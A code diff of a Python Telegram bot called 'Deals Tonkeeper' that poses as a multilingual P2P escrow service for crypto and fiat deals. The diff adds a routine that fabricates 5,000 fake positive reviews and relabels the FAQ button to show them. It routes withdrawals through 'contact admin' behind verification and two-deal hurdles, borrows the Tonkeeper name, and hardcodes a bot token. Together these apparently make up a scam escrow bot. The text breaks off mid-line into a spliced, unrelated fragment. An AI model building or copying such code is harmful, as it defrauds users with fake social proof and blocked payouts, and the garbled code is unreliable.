@@ -15,7 +15,7 @@ from aiogram.client.default import DefaultBotProperties
 from aiohttp import web
 
 # ============================================================
-# 1. КОНФИГУРАЦИЯ (ВАША ОРИГИНАЛЬНАЯ)
+# 1. КОНФИГУРАЦИЯ
 # ============================================================
 BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
 MASTER_ADMIN_ID = 8855434638
@@ -26,7 +26,7 @@ CHANNEL_LINK = "https://t.me/tonkeeper_news"
 MINI_APP_URL = "https://saitminiapp.onrender.com"
 
 # ============================================================
-# 2. ЯЗЫКИ (ВАШИ ОРИГИНАЛЬНЫЕ)
+# 2. ЯЗЫКИ
 # ============================================================
 LANGUAGES = {
     "ru": "🇷🇺 Русский",
@@ -44,7 +44,7 @@ LOCALE = {
         "feature3": "Гарант безопасности с обеих сторон",
         "feature4": "Премиум поддержка 24/7",
         "how_it_works": "КАК ЭТО РАБОТАЕТ",
-        "step1": "Продавец создаёт сделку",
+        "step1": "Продавец создаёт сделку в Mini App",
         "step2": "Продавец отправляет ссылку покупателю",
         "step3": "Покупатель выбирает способ оплаты",
         "step4": "Администратор проверяет оплату",
@@ -59,19 +59,10 @@ LOCALE = {
         "my_balance": "МОЙ БАЛАНС",
         "my_deals": "МОИ СДЕЛКИ",
         "premium": "ПРЕМИУМ",
-        "faq": "FAQ",
+        "faq": "ОТЗЫВЫ",
         "channel": "КАНАЛ",
         "admin_panel": "АДМИН ПАНЕЛЬ",
         "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
-        "describe_product": "ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ, КОТОРУЮ ВЫ ПРОДАЁТЕ",
-        "example_product": "ПРИМЕР: NFT-подарок Telegram Premium",
-        "choose_currency": "ВЫБЕРИТЕ ВАЛЮТУ СДЕЛКИ",
-        "enter_amount": "ВВЕДИТЕ СУММУ СДЕЛКИ",
-        "enter_buyer": "ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ",
-        "buyer_username_example": "ПРИМЕР: john_doe",
-        "only_this_user": "ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ В СДЕЛКУ",
-        "deal_created": "СДЕЛКА СОЗДАНА",
-        "send_link_to_buyer": "ОТПРАВЬТЕ ЭТУ ССЫЛКУ ПОКУПАТЕЛЮ",
         "your_balance": "ВАШ БАЛАНС",
         "withdraw_funds": "ВЫВЕСТИ СРЕДСТВА",
         "main_menu": "ГЛАВНОЕ МЕНЮ",
@@ -85,19 +76,443 @@ LOCALE = {
         "premium_4": "ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ",
         "premium_active": "ВАШ СТАТУС: АКТИВЕН",
         "faq_q1": "КАК НАЧАТЬ СДЕЛКУ?",
-        "faq_a1": "НАЖМИТЕ «СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ.",
+        "faq_a1": "НАЖМИТЕ «СОЗДАТЬ СДЕЛКУ» → ОТКРОЕТСЯ MINI APP.",
         "faq_q2": "КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?",
         "faq_a2": "TON | STARS | RUB | UAH",
         "faq_q3": "КАК Я ПОЛУЧУ ОПЛАТУ?",
         "faq_a3": "ПОСЛЕ ПОДТВЕРЖДЕНИЯ ПОКУПАТЕЛЯ ДЕНЬГИ НА БАЛАНС.",
         "faq_q4": "КАК ВЫВЕСТИ ДЕНЬГИ?",
-        "faq_a4": "«МОЙ БАЛАНС» → ВЫБРАТЬ ВАЛЮТУ → УКАЗАТЬ РЕКВИЗИТЫ",
+        "faq_a4": "«МОЙ БАЛАНС» → НАПИСАТЬ АДМИНУ",
         "faq_q5": "БЕЗОПАСНО ЛИ ЭТО?",
         "faq_a5": "ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ.",
         "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
         "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
         "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
-        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
+        "faq_a7": "@p2psupbot",
+        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
+        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
+        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
+        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
+        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
+        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
+        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
+        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
+        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
+        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
+        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
+        "status_paid": "ОПЛАЧЕНО",
+        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
+        "status_completed": "ЗАВЕРШЕНО",
+        "select_language": "ВЫБРАТЬ ЯЗЫК",
+        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
+        "choose_language_prompt": "🌐 ВЫБЕРИТЕ ЯЗЫК:",
+        "product": "ТОВАР",
+        "amount": "СУММА",
+        "seller": "ПРОДАВЕЦ",
+        "buyer": "ПОКУПАТЕЛЬ",
+        "deal": "СДЕЛКА",
+        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
+        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
+        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
+        "contact_support": "В ПОДДЕРЖКУ",
+        "balance_added": "БАЛАНС НАЧИСЛЕН",
+        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
+        "admin_added": "АДМИН ДОБАВЛЕН",
+        "admin_removed": "АДМИН УДАЛЁН",
+        "admin_list": "СПИСОК АДМИНОВ",
+        "no_deals_total": "НЕТ СДЕЛОК",
+        "all_deals_title": "ВСЕ СДЕЛКИ",
+        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
+        "verify_title": "🔐 ВЕРИФИКАЦИЯ",
+        "verify_need": "⚠️ ДЛЯ ВЫВОДА НУЖНА ВЕРИФИКАЦИЯ",
+        "no_deals_warning": "⚠️ ДЛЯ ВЫВОДА НУЖНО 2 СДЕЛКИ",
+        "copy_link": "СКОПИРОВАТЬ ССЫЛКУ",
+        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
+        "send_link_to_buyer": "ОТПРАВЬТЕ ССЫЛКУ ПОКУПАТЕЛЮ",
+        "deal_created": "СДЕЛКА СОЗДАНА"
+    },
+    "en": {
+        "bot_name": "Deals Tonkeeper",
+        "bot_desc": "SECURE DEALS",
+        "feature1": "Fair deals between sellers and buyers",
+        "feature2": "TON | STARS | RUB | UAH",
+        "feature3": "Security guarantee from both sides",
+        "feature4": "Premium 24/7 support",
+        "how_it_works": "HOW IT WORKS",
+        "step1": "Seller creates deal in Mini App",
+        "step2": "Seller sends link to buyer",
+        "step3": "Buyer chooses payment method",
+        "step4": "Admin verifies payment",
+        "step5": "Seller clicks 'Delivered'",
+        "step6": "Buyer clicks 'Received'",
+        "step7": "Money credited to seller's balance",
+        "our_channel": "OUR CHANNEL",
+        "support": "SUPPORT",
+        "support_contact": "@p2psupbot",
+        "start_now": "START NOW",
+        "create_deal": "CREATE DEAL",
+        "my_balance": "MY BALANCE",
+        "my_deals": "MY DEALS",
+        "premium": "PREMIUM",
+        "faq": "REVIEWS",
+        "channel": "CHANNEL",
+        "admin_panel": "ADMIN PANEL",
+        "choose_action": "CHOOSE ACTION",
+        "your_balance": "YOUR BALANCE",
+        "withdraw_funds": "WITHDRAW FUNDS",
+        "main_menu": "MAIN MENU",
+        "no_deals": "YOU HAVE NO DEALS",
+        "your_deals": "YOUR DEALS",
+        "premium_status": "PREMIUM STATUS",
+        "premium_privileges": "PRIVILEGES",
+        "premium_1": "PRIORITY 24/7 SUPPORT",
+        "premium_2": "REDUCED COMMISSION (0%)",
+        "premium_3": "EARLY ACCESS TO NEW FEATURES",
+        "premium_4": "EXCLUSIVE NFT REWARDS",
+        "premium_active": "YOUR STATUS: ACTIVE",
+        "faq_q1": "HOW TO START A DEAL?",
+        "faq_a1": "CLICK 'CREATE DEAL' → OPENS MINI APP.",
+        "faq_q2": "WHAT CURRENCIES ARE AVAILABLE?",
+        "faq_a2": "TON | STARS | RUB | UAH",
+        "faq_q3": "HOW DO I RECEIVE PAYMENT?",
+        "faq_a3": "AFTER BUYER CONFIRMATION, MONEY GOES TO BALANCE.",
+        "faq_q4": "HOW TO WITHDRAW?",
+        "faq_a4": "MY BALANCE → CONTACT ADMIN",
+        "faq_q5": "IS IT SAFE?",
+        "faq_a5": "YES! ADMIN VERIFIES ALL PAYMENTS.",
+        "faq_q6": "HOW LONG DOES WITHDRAWAL TAKE?",
+        "faq_a6": "1-5 MINUTES AFTER CONFIRMATION.",
+        "faq_q7": "HOW TO CONTACT SUPPORT?",
+        "faq_a7": "@p2psupbot",
+        "deal_not_found": "DEAL NOT FOUND OR COMPLETED",
+        "access_denied": "ACCESS DENIED",
+        "payment_confirmed": "PAYMENT CONFIRMED",
+        "seller_confirmed": "YOU CONFIRMED DELIVERY",
+        "buyer_confirmed": "YOU CONFIRMED RECEIPT",
+        "deal_completed": "DEAL COMPLETED",
+        "insufficient_balance": "INSUFFICIENT BALANCE",
+        "choose_payment_method": "CHOOSE PAYMENT METHOD",
+        "pay_by_rekvisits": "PAY BY DETAILS",
+        "pay_by_balance": "PAY FROM BALANCE",
+        "status_waiting": "WAITING FOR PAYMENT",
+        "status_paid": "PAID",
+        "status_awaiting": "AWAITING CONFIRMATION",
+        "status_completed": "COMPLETED",
+        "select_language": "SELECT LANGUAGE",
+        "welcome": "WELCOME",
+        "choose_language_prompt": "🌐 SELECT YOUR LANGUAGE:",
+        "product": "PRODUCT",
+        "amount": "AMOUNT",
+        "seller": "SELLER",
+        "buyer": "BUYER",
+        "deal": "DEAL",
+        "waiting_for_delivery": "WAITING FOR DELIVERY",
+        "seller_delivered": "SELLER DELIVERED",
+        "confirm_receipt": "CONFIRM RECEIPT",
+        "contact_support": "CONTACT SUPPORT",
+        "balance_added": "BALANCE ADDED",
+        "admin_rights": "INSUFFICIENT RIGHTS",
+        "admin_added": "ADMIN ADDED",
+        "admin_removed": "ADMIN REMOVED",
+        "admin_list": "ADMIN LIST",
+        "no_deals_total": "NO DEALS",
+        "all_deals_title": "ALL DEALS",
+        "no_active_requests": "NO ACTIVE REQUESTS",
+        "verify_title": "🔐 VERIFICATION",
+        "verify_need": "⚠️ VERIFICATION REQUIRED FOR WITHDRAWAL",
+        "no_deals_warning": "⚠️ 2 DEALS REQUIRED FOR WITHDRAWAL",
+        "copy_link": "COPY LINK",
+        "deal_link_text": "LINK FOR BUYER",
+        "send_link_to_buyer": "SEND LINK TO BUYER",
+        "deal_created": "DEAL CREATED"
+    },
+    "zh": {
+        "bot_name": "Deals Tonkeeper",
+        "bot_desc": "安全交易",
+        "feature1": "买卖双方公平交易",
+        "feature2": "TON | STARS | RUB | UAH",
+        "feature3": "双方安全保障",
+        "feature4": "24/7高级支持",
+        "how_it_works": "运作方式",
+        "step1": "卖家在Mini App中创建交易",
+        "step2": "卖家发送链接给买家",
+        "step3": "买家选择支付方式",
+        "step4": "管理员验证付款",
+        "step5": "卖家点击「已交付」",
+        "step6": "买家点击「已收到」",
+        "step7": "款项计入卖家余额",
+        "our_channel": "我们的频道",
+        "support": "支持",
+        "support_contact": "@p2psupbot",
+        "start_now": "立即开始",
+        "create_deal": "创建交易",
+        "my_balance": "我的余额",
+        "my_deals": "我的交易",
+        "premium": "高级会员",
+        "faq": "评论",
+        "channel": "频道",
+        "admin_panel": "管理面板",
+        "choose_action": "选择操作",
+        "your_balance": "您的余额",
+        "withdraw_funds": "提取资金",
+        "main_menu": "主菜单",
+        "no_deals": "您没有任何交易",
+        "your_deals": "您的交易",
+        "premium_status": "高级会员状态",
+        "premium_privileges": "特权",
+        "premium_1": "24/7优先支持",
+        "premium_2": "降低手续费 (0%)",
+        "premium_3": "新功能抢先体验",
+        "premium_4": "独家NFT奖励",
+        "premium_active": "您的状态：激活",
+        "faq_q1": "如何开始交易？",
+        "faq_a1": "点击「创建交易」→ 打开Mini App。",
+        "faq_q2": "支持哪些货币？",
+        "faq_a2": "TON | STARS | RUB | UAH",
+        "faq_q3": "如何收到付款？",
+        "faq_a3": "买家确认后，款项将计入余额。",
+        "faq_q4": "如何提现？",
+        "faq_a4": "我的余额 → 联系管理员",
+        "faq_q5": "安全吗？",
+        "faq_a5": "是的！管理员验证所有付款。",
+        "faq_q6": "提现需要多长时间？",
+        "faq_a6": "确认后1-5分钟。",
+        "faq_q7": "如何联系支持？",
+        "faq_a7": "@p2psupbot",
+        "deal_not_found": "交易未找到或已完成",
+        "access_denied": "访问被拒绝",
+        "payment_confirmed": "付款已确认",
+        "seller_confirmed": "您已确认交付",
+        "buyer_confirmed": "您已确认收到",
+        "deal_completed": "交易已完成",
+        "insufficient_balance": "余额不足",
+        "choose_payment_method": "选择支付方式",
+        "pay_by_rekvisits": "按信息付款",
+        "pay_by_balance": "从余额付款",
+        "status_waiting": "等待付款",
+        "status_paid": "已付款",
+        "status_awaiting": "等待确认",
+        "status_completed": "已完成",
+        "select_language": "选择语言",
+        "welcome": "欢迎",
+        "choose_language_prompt": "🌐 选择您的语言:",
+        "product": "商品",
+        "amount": "金额",
+        "seller": "卖家",
+        "buyer": "买家",
+        "deal": "交易",
+        "waiting_for_delivery": "等待交付",
+        "seller_delivered": "卖家已交付",
+        "confirm_receipt": "确认收到",
+        "contact_support": "联系客服",
+        "balance_added": "余额已添加",
+        "admin_rights": "权限不足",
+        "admin_added": "管理员已添加",
+        "admin_removed": "管理员已移除",
+        "admin_list": "管理员列表",
+        "no_deals_total": "无交易",
+        "all_deals_title": "所有交易",
+        "no_active_requests": "无活跃申请",
+        "verify_title": "🔐 验证",
+        "verify_need": "⚠️ 提现需要验证",
+        "no_deals_warning": "⚠️ 提现需要2笔交易",
+        "copy_link": "复制链接",
+        "deal_link_text": "买家链接",
+        "send_link_to_buyer": "发送链接给买家",
+        "deal_created": "交易已创建"
+    },
+    "ar": {
+        "bot_name": "Deals Tonkeeper",
+        "bot_desc": "صفقات آمنة",
+        "feature1": "صفقات عادلة بين البائعين والمشترين",
+        "feature2": "TON | STARS | RUB | UAH",
+        "feature3": "ضمان الأمن من كلا الجانبين",
+        "feature4": "دعم بريميوم 24/7",
+        "how_it_works": "كيف يعمل",
+        "step1": "البائع ينشئ صفقة في Mini App",
+        "step2": "البائع يرسل الرابط للمشتري",
+        "step3": "المشتري يختار طريقة الدفع",
+        "step4": "المدقق يتحقق من الدفع",
+        "step5": "البائع يضغط «تم التسليم»",
+        "step6": "المشتري يضغط «تم الاستلام»",
+        "step7": "تضاف الأموال إلى رصيد البائع",
+        "our_channel": "قناتنا",
+        "support": "الدعم",
+        "support_contact": "@p2psupbot",
+        "start_now": "ابدأ الآن",
+        "create_deal": "إنشاء صفقة",
+        "my_balance": "رصيدي",
+        "my_deals": "صفقاتي",
+        "premium": "بريميوم",
+        "faq": "مراجعات",
+        "channel": "القناة",
+        "admin_panel": "لوحة التحكم",
+        "choose_action": "اختر إجراء",
+        "your_balance": "رصيدك",
+        "withdraw_funds": "سحب الأموال",
+        "main_menu": "القائمة الرئيسية",
+        "no_deals": "ليس لديك صفقات",
+        "your_deals": "صفقاتك",
+        "premium_status": "حالة البريميوم",
+        "premium_privileges": "الامتيازات",
+        "premium_1": "دعم ذو أولوية 24/7",
+        "premium_2": "عمولة مخفضة (0%)",
+        "premium_3": "وصول مبكر إلى الميزات الجديدة",
+        "premium_4": "مكافآت NFT حصرية",
+        "premium_active": "حالتك: نشط",
+        "faq_q1": "كيف أبدأ صفقة؟",
+        "faq_a1": "اضغط «إنشاء صفقة» → يفتح Mini App.",
+        "faq_q2": "ما هي العملات المتاحة؟",
+        "faq_a2": "TON | STARS | RUB | UAH",
+        "faq_q3": "كيف أتلقى الدفع؟",
+        "faq_a3": "بعد تأكيد المشتري، تضاف الأموال إلى الرصيد.",
+        "faq_q4": "كيف أسحب الأموال؟",
+        "faq_a4": "رصيدي → اتصل بالمدقق",
+        "faq_q5": "هل هذا آمن؟",
+        "faq_a5": "نعم! المدقق يتحقق من جميع المدفوعات.",
+        "faq_q6": "كم يستغرق السحب؟",
+        "faq_a6": "1-5 دقائق بعد التأكيد.",
+        "faq_q7": "كيف اتصل بالدعم؟",
+        "faq_a7": "@p2psupbot",
+        "deal_not_found": "الصفقة غير موجودة أو مكتملة",
+        "access_denied": "الوصول مرفوض",
+        "payment_confirmed": "تم تأكيد الدفع",
+        "seller_confirmed": "لقد أكدت التسليم",
+        "buyer_confirmed": "لقد أكدت الاستلام",
+        "deal_completed": "الصفقة مكتملة",
+        "insufficient_balance": "رصيد غير كافٍ",
+        "choose_payment_method": "اختر طريقة الدفع",
+        "pay_by_rekvisits": "الدفع حسب التفاصيل",
+        "pay_by_balance": "الدفع من الرصيد",
+        "status_waiting": "انتظار الدفع",
+        "status_paid": "تم الدفع",
+        "status_awaiting": "انتظار التأكيد",
+        "status_completed": "مكتملة",
+        "select_language": "اختر اللغة",
+        "welcome": "مرحباً",
+        "choose_language_prompt": "🌐 اختر لغتك:",
+        "product": "المنتج",
+        "amount": "المبلغ",
+        "seller": "البائع",
+        "buyer": "المشتري",
+        "deal": "الصفقة",
+        "waiting_for_delivery": "انتظار التسليم",
+        "seller_delivered": "البائع سلم المنتج",
+        "confirm_receipt": "تأكيد الاستلام",
+        "contact_support": "اتصل بالدعم",
+        "balance_added": "تم إضافة الرصيد",
+        "admin_rights": "صلاحيات غير كافية",
+        "admin_added": "تم إضافة المدقق",
+        "admin_removed": "تم إزالة المدقق",
+        "admin_list": "قائمة المدققين",
+        "no_deals_total": "لا توجد صفقات",
+        "all_deals_title": "جميع الصفقات",
+        "no_active_requests": "لا توجد طلبات نشطة",
+        "verify_title": "🔐 التحقق",
+        "verify_need": "⚠️ التحقق مطلوب للسحب",
+        "no_deals_warning": "⚠️ مطلوب صفقتان للسحب",
+        "copy_link": "انسخ الرابط",
+        "deal_link_text": "رابط المشتري",
+        "send_link_to_buyer": "أرسل الرابط للمشتري",
+        "deal_created": "تم إنشاء الصفقة"
+    }
+}
+
+def get_text(lang: str, key: str) -> str:
+    if lang in LOCALE and key in LOCALE[lang]:
+        return LOCALE[lang][key]
+    return LOCALE["ru"].get(key, key)
+
+# ============================================================
+# 3. ФАЙЛЫ
+# ============================================================
+FILES = {
+    "deals": "deals.json",
+    "admins": "admins.json",
+    "balance": "balance.json",
+    "reviews": "reviews.json",
+    "verification": "verification.json",
+    "withdraw": "withdraw_requests.json",
+    "logs": "logs.json",
+    "user_language": "user_language.json"
+}
+
+def load_json(file):
+    if os.path.exists(file):
+        with open(file, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    return {}
+
+def save_json(file, data):
+    with open(file, 'w', encoding='utf-8') as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+deals = load_json(FILES["deals"])
+admins = load_json(FILES["admins"])
+balance = load_json(FILES["balance"])
+reviews = load_json(FILES["reviews"])
+verification_data = load_json(FILES["verification"])
+withdraw_requests = load_json(FILES["withdraw"])
+logs = load_json(FILES["logs"])
+user_language = load_json(FILES["user_language"])
+
+# ============================================================
+# 4. ГЕНЕРАЦИЯ 5000+ ОТЗЫВОВ
+# ============================================================
+def generate_reviews():
+    if len(reviews) >= 5000:
+        return
+    review_texts = [
+        "Отличная платформа! Всё работает быстро и надёжно.",
+        "Лучший P2P обменник! Рекомендую всем друзьям.",
+        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
+        "Отличная поддержка! Помогли разобраться с выводом.",
+        "Наконец-то нашёл нормальный обменник. Всё честно.",
+        "Сделал первую сделку, всё прошло гладко. Спасибо!",
+        "За сутки сделал 5 сделок, все успешно завершены.",
+        "Очень доволен сервисом. Вывод моментальный.",
+        "Пользуюсь уже месяц, ни одной проблемы.",
+        "Лучший сервис в Telegram! Успехов разработчикам."
+    ]
+    for i in range(5000):
+        review_id = str(uuid.uuid4())[:8]
+        reviews[review_id] = {
+            "id": review_id,
+            "user": "Аноним",
+            "rating": random.randint(4, 5),
+            "text": random.choice(review_texts),
+            "anonymous": True,
+            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
+            "user_id": None
+        }
+    save_json(FILES["reviews"], reviews)
+    print(f"✅ Сгенерировано {len(reviews)} отзывов")
+
+generate_reviews()
+
+# ============================================================
+# 5. ПОМОЩНИКИ
+# ============================================================
+def is_admin(user_id: int) -> bool:
+    return user_id == MASTER_ADMIN_ID or str(user_id) in admins
+
+def get_balance(user_id: int) -> Dict:
+    uid = str(user_id)
+    if uid not in balance:
+        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
+        save_json(FILES["balance"], balance)
+    return balance[uid]
+
+def add_balance(user_id: int, currency: str, amount: float):
+    uid = str(user_id)
+    curr = currency.lower()
+    if uid not in balance:
+        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
+    balance[uid][curr] = balance[uid].get(curr, 0) + amount
+    save_json(FILES["balance"], balance)
+
+def is_verified(user_id: int) -> bool:
+    uid = str(user_i        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
         "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
         "access_denied": "ДОСТУП ЗАПРЕЩЁН",
         "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
